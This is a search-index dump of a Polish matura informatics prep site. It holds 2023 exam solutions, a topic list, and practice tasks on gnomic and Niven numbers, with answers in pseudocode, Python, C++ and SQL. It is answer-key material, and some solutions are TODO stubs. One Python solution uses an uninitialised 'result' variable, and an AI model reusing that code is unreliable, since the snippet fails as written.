hex_dict:\n    print(f\"{el}: {hex_dict[el]}\")\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/","title":"2023","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/#arkusz","title":"Arkusz","text":"<p> Arkusz</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#zadanie-1","title":"Zadanie 1","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#11","title":"1.1","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#12","title":"1.2","text":"\\(n\\) - liczba ksi\u0105\u017cek Minimalna liczba p\u00f3\u0142ek Maksymalna liczba p\u00f3\u0142ek 1 1 1 3 2 3 4 3 4 7 3 7 16 5 16 31 5 31 32 6 32 \\(2^k - 1\\), dla \\(k&gt;0\\) \\(k\\) \\(2^k - 1\\)"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#13","title":"1.3","text":"<p>a) \\(9, 2, 12, 10, 14, 13, 15\\) </p> <p>b) \\(10, 8, 4, 6, 15, 12, 13\\)</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#zadanie-2","title":"Zadanie 2","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#21","title":"2.1","text":"<pre><code>1. b := 1\n2. ostatnia := n mod 2\n3. n := n div 2\n4. Dop\u00f3ki n &gt; 0, wykonuj:\n    5. Je\u017celi n mod 2 != ostatnia:\n        6. b := b + 1\n        7. ostatnia := n mod 2\n    8. n := n div 2\n9. Wypisz b\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#22","title":"2.2","text":"Python <pre><code>with open(\"bin.txt\") as input_file:\n  binary_list = input_file.read().split()\n\nresult = 0\n\nfor bn in binary_list:\n  if bn.count(\"01\") + bn.count(\"10\") &lt;= 1:\n    result += 1\n\nprint(result)\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#23","title":"2.3","text":"Python <pre><code>with open(\"bin.txt\") as input_file:\n  binary_list = input_file.read().split()\n\nbinary_list.sort(key=lambda el: int(el, 2))\n\nprint(binary_list[-1])\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#24","title":"2.4","text":"<p>\\((123_{10} \\oplus 101101_2) \\oplus 2D_{16} = 123_{10}\\)</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#25","title":"2.5","text":"Python <pre><code>with open(\"bin.txt\") as input_file:\n  binary_list = input_file.read().split()\n\nfor bn in binary_list:\n  result = str(bin(int(bn, 2) ^ (int(bn, 2) // 2))).lstrip(\"0b\")\n  print(result)\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#zadanie-3","title":"Zadanie 3","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#31","title":"3.1","text":"<p>TODO</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#32","title":"3.2","text":"<p>TODO</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#33","title":"3.3","text":"<p>TODO</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#34","title":"3.4","text":"<p>TODO</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#zadanie-4","title":"Zadanie 4","text":"<ol> <li>P</li> <li>F</li> </ol>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#zadanie-5","title":"Zadanie 5","text":"<p>\\(134_5 &lt; 134_6\\)</p> <p>\\(2222_3 &lt; 1111_6\\)</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#zadanie-6","title":"Zadanie 6","text":"<p> Rozwi\u0105zanie - Excel</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#61","title":"6.1","text":"<p>https://jmp.sh/whDEfpik</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#62","title":"6.2","text":"<p>https://jmp.sh/A9EuPPp3</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#63-i-64","title":"6.3 i 6.4","text":"<p>https://jmp.sh/JfzN7REr</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#zadanie-7","title":"Zadanie 7","text":"<p> Rozwi\u0105zanie - Access</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#71","title":"7.1","text":"<p>https://jmp.sh/AcK5dXDf</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#72","title":"7.2","text":"<p>https://jmp.sh/YLtAaFsp</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#73","title":"7.3","text":"<p>https://jmp.sh/1VcfOKEW</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#74","title":"7.4","text":"<p>https://jmp.sh/tHCeL5oN</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023/solutions/#75","title":"7.5","text":"<pre><code>SELECT SUM(cena) \n  FROM Sklep \n    LEFT JOIN Gry USING(id_gry) \n  WHERE kategoria=\"logiczna\" AND promocja=true;\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023-czerwiec-cke/","title":"2023 czerwiec","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023-czerwiec-cke/#arkusz","title":"Arkusz","text":"<p> Arkusz</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023-czerwiec-cke/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023-czerwiec-cke/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023-czerwiec-cke/solutions/#zadanie-1","title":"Zadanie 1","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023-czerwiec-cke/solutions/#zadanie-13","title":"Zadanie 1.3","text":"Python <pre><code>x = int(input(\"x = \"))\ny = int(input(\"y = \"))\n\nz = 0\n\nwhile y &gt;= 1:\n    if y % 2 == 1:\n        z = z + x\n\n    x = x + x\n    y = y // 2\n\nprint(z)\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023-czerwiec-cke/solutions/#zadanie-3","title":"Zadanie 3","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023-czerwiec-cke/solutions/#zadanie-31","title":"Zadanie 3.1","text":"Python <pre><code>with open(\"anagram.txt\") as file:\n    binary_list = file.read().split()\n\nresult1 = 0\nresult2 = 0\nfor binary in binary_list:\n    count0 = binary.count(\"0\")\n    count1 = binary.count(\"1\")\n    if count0 == count1:\n        result1 += 1\n    elif abs(count0 - count1) == 1:\n        result2 += 1\n\nprint(\"Zadanie 3.1\")\nprint(\"Zr\u00f3wnowa\u017cone:\", result1)\nprint(\"Prawie zr\u00f3wnowa\u017cone:\", result2)\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023-czerwiec-cke/solutions/#zadanie-32","title":"Zadanie 3.2","text":"Python <pre><code>from math import factorial\n\n\nwith open(\"anagram.txt\") as file:\n    binary_list = file.read().split()\n\nmax_anagrams = 0\nfor binary in binary_list:\n    if len(binary) != 8:\n        continue\n\n    count0 = binary.count(\"0\")\n    count1 = binary.count(\"1\")\n    anagrams_count = factorial(8) / (factorial(count0) * factorial(count1))\n    if count0 &gt; 0:\n        anagrams_count -= factorial(7) / (factorial(count0 - 1) * factorial(count1))\n    if anagrams_count &gt; max_anagrams:\n        max_anagrams = anagrams_count\n\nprint(\"Zadanie 3.2\")\nfor binary in binary_list:\n    if len(binary) != 8:\n        continue\n\n    count0 = binary.count(\"0\")\n    count1 = binary.count(\"1\")\n    anagrams_count = factorial(8) / (factorial(count0) * factorial(count1))\n    if count0 &gt; 0:\n        anagrams_count -= factorial(7) / (factorial(count0 - 1) * factorial(count1))\n    if anagrams_count == max_anagrams:\n        print(binary)\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023-czerwiec-cke/solutions/#zadanie-33","title":"Zadanie 3.3","text":"Python <pre><code>with open(\"anagram.txt\") as file:\n    binary_list = file.read().split()\n\nmax_diff = 0\nfor i in range(1, len(binary_list)):\n    diff = abs(int(binary_list[i], 2) - int(binary_list[i - 1], 2))\n    if diff &gt; max_diff:\n        max_diff = diff\n\nprint(\"Zadanie 3.3\")\nprint(bin(max_diff))\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023-czerwiec-cke/solutions/#zadanie-34","title":"Zadanie 3.4","text":"Python <pre><code>with open(\"anagram.txt\") as file:\n    binary_list = file.read().split()\n\nresult1 = 0\nmax_distinct_sum = 0\nfor binary in binary_list:\n    decimal = int(binary, 2)\n    decimal_str = str(decimal)\n    if decimal_str.count(\"0\") == 0:\n        result1 += 1\n\n    distinct_sum = sum(map(int, set(decimal_str)))\n    if distinct_sum &gt; max_distinct_sum:\n        max_distinct_sum = distinct_sum\n\nprint(\"Zadanie 3.4\")\nprint(\"a)\", result1)\n\nfor binary in binary_list:\n    decimal = int(binary, 2)\n    decimal_str = str(decimal)\n\n    distinct_sum = sum(map(int, set(decimal_str)))\n    if distinct_sum == max_distinct_sum:\n        print(\"b)\", decimal)\n        break\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023-czerwiec-cke/solutions/#zadanie-6","title":"Zadanie 6","text":"<p> Rozwi\u0105zanie - Excel</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023-czerwiec-cke/solutions/#zadanie-7","title":"Zadanie 7","text":"<p> Rozwi\u0105zanie - Access</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023-probna-cke/","title":"2023 - przyk\u0142adowy arkusz CKE","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023-probna-cke/#arkusze","title":"Arkusze","text":"<p> Arkusz</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2023-probna-cke/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/przygotowanie/","title":"Przygotowanie","text":"<p>Zestaw \u0107wicze\u0144 i materia\u0142\u00f3w pomagaj\u0105cych w przygotowaniu si\u0119 do matury z informatyki.</p>"},{"location":"matura-z-informatyki/przygotowanie/#lista-najwazniejszych-zagadnien","title":"Lista najwa\u017cniejszych zagadnie\u0144","text":""},{"location":"matura-z-informatyki/przygotowanie/#algorytmy-ktore-nalezy-umiec-szybko-i-sprawnie-zapisac-na-kartce-w-pseudokodzie-nie-uzywajac-funkcji-z-wybranego-jezyka-programowania","title":"Algorytmy, kt\u00f3re nale\u017cy umie\u0107 szybko i sprawnie zapisa\u0107 na kartce w pseudokodzie nie u\u017cywaj\u0105c funkcji z wybranego j\u0119zyka programowania","text":"<p>min-or-max.md</p> <p>prime-test.md</p> <p>linear-search.md</p> <p>binary-search.md</p> <p>bubble-sort.md</p>"},{"location":"matura-z-informatyki/przygotowanie/#algorytmy-ktore-nalezy-umiec-szybko-i-sprawnie-zaimplementowac-w-wybranym-jezyku-programowania","title":"Algorytmy, kt\u00f3re nale\u017cy umie\u0107 szybko i sprawnie zaimplementowa\u0107 w wybranym j\u0119zyku programowania","text":"<p>min-or-max.md</p> <p>linear-search.md</p> <p>binary-search.md</p> <p>longest-growing-substring.md</p>"},{"location":"matura-z-informatyki/przygotowanie/#zagadnienia-programistyczne-ktore-nalezy-opanowac","title":"Zagadnienia programistyczne, kt\u00f3re nale\u017cy opanowa\u0107","text":"<ul> <li>Czytanie i pisanie do pliku tekstowego.</li> <li>Wczytywanie danych w r\u00f3\u017cnych formatach.</li> <li>Tablice/listy.</li> <li>Funkcje.</li> <li>Sortowanie z podawaniem w\u0142asnej funkcji sortuj\u0105cej.</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/#formuy-i-narzedzia-arkusza-kalkulacyjnego-excel-ktore-nalezy-dobrze-opanowac","title":"Formu\u0142y i narz\u0119dzia arkusza kalkulacyjnego (Excel), kt\u00f3re nale\u017cy dobrze opanowa\u0107","text":"<ul> <li>Import danych z pliku.</li> <li>Tabela przestawna.</li> <li>Formatowanie warunkowe.</li> <li>Sortowanie.</li> <li>Filtrowanie.</li> <li>Usuwanie duplikat\u00f3w.</li> <li>Blokowanie kolumn i wierszy w formu\u0142ach.</li> <li>Autouzupe\u0142nianie.</li> <li>Tworzenie wykres\u00f3w.</li> <li>Zmiana formatowania warto\u015bci.</li> <li>Je\u017celi</li> <li>Suma.Je\u017celi</li> <li>Licz.Je\u017celi</li> <li>Suma.Warunk\u00f3w</li> <li>Licz.Warunki</li> <li>Modu\u0142.Liczby</li> <li>Oraz</li> <li>Lub</li> <li>Fragment.Tekstu</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/#zagadnienia-zwiazane-z-bazami-danych-access","title":"Zagadnienia zwi\u0105zane z bazami danych (Access)","text":"<ul> <li>Ustalanie formatu daty podczas importowania danych.</li> <li>Zmiana w\u0142asno\u015bci sprz\u0119\u017cenia.</li> <li>Funkcja DateDiff.</li> <li>Funkcja IIf.</li> <li>Kwerendy sumuj\u0105ce.</li> <li>Sortowanie po kilku kolumnach.</li> <li>Tworzenie w\u0142asnych kolumn w kwerendach.</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/gnomic-numbers/","title":"Liczby gnomiczne","text":"<p>Liczby gnomiczne to liczby naturalne postaci \\(2n+1\\) spe\u0142niaj\u0105ce poni\u017csze r\u00f3wnanie:</p> \\[ 2n+1+n^2=(n+1)^2 \\] <p>Przyk\u0142adem liczby gnomicznej jest \\(7\\), poniewa\u017c:</p> \\[ 7 = 2*3+1 \\] \\[ 2*3 + 1 + 3^2 = (3+1)^2 \\]"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/gnomic-numbers/#zadanie-1","title":"Zadanie 1","text":"<p>Uzupe\u0142nij poni\u017csz\u0105 tabelk\u0119 okre\u015blaj\u0105c dla podanej liczby \\(k\\) czy jest liczb\u0105 gnomiczn\u0105.</p> k Liczba gnomiczna 9 TAK 10 NIE 15 24 121"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/gnomic-numbers/#zadanie-2","title":"Zadanie 2","text":"<p>Zaprojektuj algorytm sprawdzaj\u0105cy, dla zadanej liczby naturalnej \\(k\\), czy jest ona liczb\u0105 gnomiczn\u0105.</p> <p>Uwaga: w swoim zapisie mo\u017cesz korzysta\u0107 jedynie z podstawowych operacji arytmetycznych (dodawanie, odejmowanie, mno\u017cenie, dzielenie, reszta z dzielenia, dzielenie ca\u0142kowite), instrukcji kontroli przep\u0142ywu (instrukcja warunkowa, p\u0119tla warunkowa, p\u0119tla licz\u0105ca), instrukcji dotycz\u0105cych podstawowych operacji na zmiennych (utworzenie zmiennej, przypisanie warto\u015bci, odczytanie warto\u015bci), instrukcji dotycz\u0105cych podstawowych operacji na tablicach (utworzenie tablicy o zadanym rozmiarze wype\u0142nionej jedn\u0105 warto\u015bci\u0105, odwo\u0142anie do elementu tablicy pod zadanym indeksem) oraz samodzielnie zdefiniowanych funkcji.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/gnomic-numbers/#zadanie-3","title":"Zadanie 3","text":"<p>W pliku gnomiczne.txt podanych jest \\(100\\) liczb naturalnych zapisanych w systemie binarnym, ka\u017cda w osobnej linii.</p> <p> gnomiczne.txt</p> <p>W pliku gnomiczne_przyklad.txt podanych jest \\(10\\) liczb naturalnych zapisanych w systemie binarnym, ka\u017cda w osobnej linii.</p> <p> gnomiczne_przyklad.txt</p> <p>Napisz program, kt\u00f3ry policzy, ile jest liczb gnomicznych w pliku.</p> <p>Dla pliku gnomiczne_przyklad.txt odpowied\u017a to: \\(4\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/gnomic-numbers/answers/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/gnomic-numbers/answers/#zadanie-1","title":"Zadanie 1","text":"k Liczba gnomiczna 9 TAK 10 NIE 15 TAK 24 NIE 121 TAK"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/gnomic-numbers/answers/#zadanie-2","title":"Zadanie 2","text":"<pre><code>funkcja czy_gnomiczna(k):\n    1. Je\u017celi k mod 2 == 1:\n        2. Zwr\u00f3\u0107 PRAWDA\n    3. Zwr\u00f3\u0107 FA\u0141SZ\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/gnomic-numbers/answers/#zadanie-3","title":"Zadanie 3","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/gnomic-numbers/answers/#odpowiedz","title":"Odpowied\u017a","text":"<p>\\(42\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/gnomic-numbers/answers/#rozwiazanie","title":"Rozwi\u0105zanie","text":"PythonC++ <pre><code>with open(\"gnomiczne.txt\") as file:\n    binary = file.read().strip().split(\"\\n\")\n\nfor num in binary:\n    if num[-1] == '1':\n        result += 1\n\nprint(result)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"gnomiczne.txt\");\n    string binary;\n    int result = 0;\n\n    for(int i = 0; i &lt; 100; i++) {\n        file &gt;&gt; binary;\n        if (binary[binary.length() - 1] == '1') {\n            result++;\n        }\n    }\n\n    cout &lt;&lt; result &lt;&lt; endl;\n    file.close();\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/","title":"Lista liczb","text":"<p>Zadane s\u0105 nast\u0119puj\u0105ce dane wej\u015bciowe:</p> <ul> <li>\\(n\\) - liczba naturalna, \\(n&gt;0\\),</li> <li>\\(A[1..n]\\) - tablica \\(n\\) liczb ca\u0142kowitych z przedzia\u0142u \\([-10^6, 10^6]\\), indeksowana od jedynki.</li> </ul> <p>Rozwi\u0105\u017c poni\u017csze zadania. Rozwi\u0105zania zapisz w postaci pseudokodu. W swoim zapisie mo\u017cesz korzysta\u0107 jedynie z podstawowych operacji arytmetycznych (dodawanie, odejmowanie, mno\u017cenie, dzielenie, reszta z dzielenia, dzielenie ca\u0142kowite), instrukcji kontroli przep\u0142ywu (instrukcja warunkowa, p\u0119tla warunkowa, p\u0119tla licz\u0105ca), instrukcji dotycz\u0105cych podstawowych operacji na zmiennych (utworzenie zmiennej, przypisanie warto\u015bci, odczytanie warto\u015bci), instrukcji dotycz\u0105cych podstawowych operacji na tablicach (utworzenie tablicy o zadanym rozmiarze wype\u0142nionej jedn\u0105 warto\u015bci\u0105, odwo\u0142anie do elementu tablicy pod zadanym indeksem) oraz samodzielnie zdefiniowanych funkcji.</p> <p>Zadbaj o optymalno\u015b\u0107 swoich rozwi\u0105za\u0144.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz funkcj\u0119, kt\u00f3ra dla danych wej\u015bciowych znajdzie najwi\u0119ksz\u0105 liczb\u0119, kt\u00f3ra wyst\u0119puje w tablicy \\(A\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/#zadanie-2","title":"Zadanie 2","text":"<p>Napisz funkcj\u0119, kt\u00f3ra dla danych wej\u015bciowych znajdzie najmniejsz\u0105 liczb\u0119 naturaln\u0105, kt\u00f3ra nie wyst\u0119puje w tablicy \\(A\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/#zadanie-3","title":"Zadanie 3","text":"<p>Napisz funkcj\u0119, kt\u00f3ra dla danych wej\u015bciowych znajdzie sum\u0119 liczb ca\u0142kowitych, kt\u00f3re wyst\u0119puj\u0105 w tablicy \\(A\\), a nast\u0119pnie obliczy i zwr\u00f3ci ich \u015bredni\u0105 arytmetyczn\u0105.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/#zadanie-4","title":"Zadanie 4","text":"<p>Napisz funkcj\u0119, kt\u00f3ra dla danych wej\u015bciowych obliczy, ile liczb z tablicy jest liczb\u0105 pierwsz\u0105.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/#zadanie-5","title":"Zadanie 5","text":"<p>Napisz funkcj\u0119, kt\u00f3ra posortuje tablic\u0119 \\(A\\) rosn\u0105co.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/#zadanie-6","title":"Zadanie 6","text":"<p>Napisz funkcj\u0119, kt\u00f3ra posortuje tablic\u0119 \\(A\\) w taki spos\u00f3b, \u017ceby najpierw wyst\u0119powa\u0142y liczby parzyste posortowane rosn\u0105co a nast\u0119pnie liczby nieparzyste posortowane malej\u0105co.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/#zadanie-7","title":"Zadanie 7","text":"<p>Napisz funkcj\u0119, kt\u00f3ra posortuje tablic\u0119 rosn\u0105co po sumie cyfr, ignoruj\u0105c znak liczby.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/#zadanie-8","title":"Zadanie 8","text":"<p>Napisz funkcj\u0119, kt\u00f3ra policzy ile liczb z tablicy jest silni\u0105 jakiej\u015b liczby naturalnej.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/#zadanie-9","title":"Zadanie 9","text":"<p>Napisz funkcj\u0119, kt\u00f3ra obliczy maksymaln\u0105 sum\u0119 dowolnego sp\u00f3jnego podci\u0105gu element\u00f3w tablicy \\(A\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/#zadanie-10","title":"Zadanie 10","text":"<p>Napisz funkcj\u0119, kt\u00f3ra znajdzie element tablicy, kt\u00f3ry wyst\u0119puje najcz\u0119\u015bciej. Je\u017celi jest kilka takich element\u00f3w, zwr\u00f3\u0107 najmniejszy z nich.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/#zadanie-11","title":"Zadanie 11","text":"<p>Napisz funkcj\u0119, kt\u00f3ra obliczy, ile warto\u015bci z przedzia\u0142u \\([-10^6, 10^6]\\) nie wyst\u0119puje w tablicy \\(A\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/#zadanie-12","title":"Zadanie 12","text":"<p>Napisz funkcj\u0119, kt\u00f3ra obliczy, ile \u0142\u0105cznie cyfr wyst\u0119puje w tablicy \\(A\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/#zadanie-13","title":"Zadanie 13","text":"<p>Napisz funkcj\u0119, kt\u00f3ra obliczy, kt\u00f3ra cyfra wyst\u0119puje w tablicy \\(A\\) najrzadziej. Je\u017celi jest kilka takich cyfr, zwr\u00f3\u0107 najwi\u0119ksz\u0105 z nich.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/solution/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/solution/#zadanie-1","title":"Zadanie 1","text":"<pre><code>funkcja Maks(n, A):\n    1. mx := A[1]\n    2. Dla i := 2 do n, wykonuj:\n        3. Je\u017celi A[i] &gt; mx, to:\n            4. mx := A[i]\n    5. Zwr\u00f3\u0107 mx\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/solution/#zadanie-2","title":"Zadanie 2","text":"<pre><code>funkcja MinNat(n, A):\n    1. nat[0..10^6+1] - tablica wype\u0142niona zerami, indeksowana od 0\n    2. Dla i := 1 do n, wykonuj:\n        3. Je\u017celi A[i] &gt;= 0, to:\n            4. nat[A[i]] := 1\n    5. Dla i := 0 do 10^6+1, wykonuj:\n        6. Je\u017celi nat[i] = 0, to:\n            7. Zwr\u00f3\u0107 i\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/solution/#zadanie-3","title":"Zadanie 3","text":"<pre><code>Funkcja Srednia(n, A):\n    1. suma := 0\n    2. Dla i := 1 do n, wykonuj:\n        3. suma := suma + A[i]\n    4. Zwr\u00f3\u0107 suma / n\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/solution/#zadanie-4","title":"Zadanie 4","text":"<pre><code>Funkcja CzyPierwsza(num):\n    1. Je\u017celi num &lt; 2, to:\n        2. Zwr\u00f3\u0107 Fa\u0142sz\n    3. i := 2\n    4. Dop\u00f3ki i * i &lt;= num, wykonuj:\n        5. Je\u017celi num mod i = 0, to:\n            6. Zwr\u00f3\u0107 Fa\u0142sz\n        7. i := i + 1\n    8. Zwr\u00f3\u0107 Prawda\n\nFunkcja IlePierwszych(n, A):\n    1. ile := 0\n    2. Dla i := 1 do n, wykonuj:\n        3. Je\u017celi CzyPierwsza(A[i]), to:\n            4. ile := ile + 1\n    5. Zwr\u00f3\u0107 ile\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/list-of-numbers/solution/#zadanie-5","title":"Zadanie 5","text":"<pre><code>Funkcja Sortuj(n, A):\n    1. Dla i := 1 do n-1, wykonuj:\n        2. Dla j := i+1 do n, wykonuj:\n            3. Je\u017celi A[j] &lt; A[i], to:\n                4. Zamie\u0144 A[i] z A[j]\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/niven-numbers/","title":"Liczby Nivena","text":"<p>Liczby Nivena to liczby naturalne, kt\u00f3re s\u0105 podzielne przez sum\u0119 swoich cyfr.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/niven-numbers/#zadanie-1","title":"Zadanie 1","text":"<p>Uzupe\u0142nij poni\u017csz\u0105 tabelk\u0119 okre\u015blaj\u0105c dla podanej liczby \\(n\\) jej sum\u0119 cyfr oraz stwierdzaj\u0105c, czy \\(n\\) jest liczb\u0105 Nivena.</p> n Suma cyfr Liczba Nivena 1 1 TAK 123 6 NIE 48 453 800"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/niven-numbers/#zadanie-2","title":"Zadanie 2","text":"<p>Zaprojektuj algorytm sprawdzaj\u0105cy, dla zadanej liczby naturalnej \\(n\\), czy jest ona liczb\u0105 Nivena.</p> <p>Uwaga: w swoim zapisie mo\u017cesz korzysta\u0107 jedynie z podstawowych operacji arytmetycznych (dodawanie, odejmowanie, mno\u017cenie, dzielenie, reszta z dzielenia, dzielenie ca\u0142kowite), instrukcji kontroli przep\u0142ywu (instrukcja warunkowa, p\u0119tla warunkowa, p\u0119tla licz\u0105ca), instrukcji dotycz\u0105cych podstawowych operacji na zmiennych (utworzenie zmiennej, przypisanie warto\u015bci, odczytanie warto\u015bci), instrukcji dotycz\u0105cych podstawowych operacji na tablicach (utworzenie tablicy o zadanym rozmiarze wype\u0142nionej jedn\u0105 warto\u015bci\u0105, odwo\u0142anie do elementu tablicy pod zadanym indeksem) oraz samodzielnie zdefiniowanych funkcji.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/niven-numbers/#zadanie-3","title":"Zadanie 3","text":"<p>W pliku niven.txt podanych jest \\(100\\) liczb naturalnych, ka\u017cda w osobnej linii.</p> <p> niven.txt</p> <p>W pliku niven_przyklad.txt podanych jest \\(10\\) liczb naturalnych, ka\u017cda w osobnej linii.</p> <p> niven_przyklad.txt</p> <p>Napisz program, kt\u00f3ry znajdzie wszystkie liczby Nivena z pliku.</p> <p>Dla pliku niven_przyklad.txt odpowied\u017a to:</p> <pre><code>756\n372\n592\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/niven-numbers/answers/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/niven-numbers/answers/#zadanie-1","title":"Zadanie 1","text":"n Suma cyfr Liczba Nivena 1 1 TAK 123 6 NIE 48 12 TAK 453 12 NIE 800 8 TAK"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/niven-numbers/answers/#zadanie-2","title":"Zadanie 2","text":"<pre><code>funkcja sumuj_cyfry(n):\n    1. suma := 0\n    2. Dop\u00f3ki n &gt; 0:\n        3. suma := suma + n mod 10\n        4. n := n // 10\n    5. Zwr\u00f3\u0107 suma\n\nfunkcja czy_liczba_nivena(n):\n    1. Je\u015bli n mod sumuj_cyfry(n) = 0:\n        2. Zwr\u00f3\u0107 PRAWDA\n    3. Zwr\u00f3\u0107 FA\u0141SZ\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/niven-numbers/answers/#zadanie-3","title":"Zadanie 3","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/niven-numbers/answers/#odpowiedz","title":"Odpowied\u017a","text":"<pre><code>423612\n437805\n257124\n271809\n638187\n398115\n113632\n480975\n150332\n276780\n682539\n323622\n101762\n496587\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/niven-numbers/answers/#rozwiazanie","title":"Rozwi\u0105zanie","text":"PythonC++ <pre><code>def is_niven(n):\n    return n % (sum(map(int, str(n)))) == 0\n\n\nwith open(\"niven.txt\") as file:\n    numbers = [int(line) for line in file]\n\nniven_numbers = [k for k in numbers if 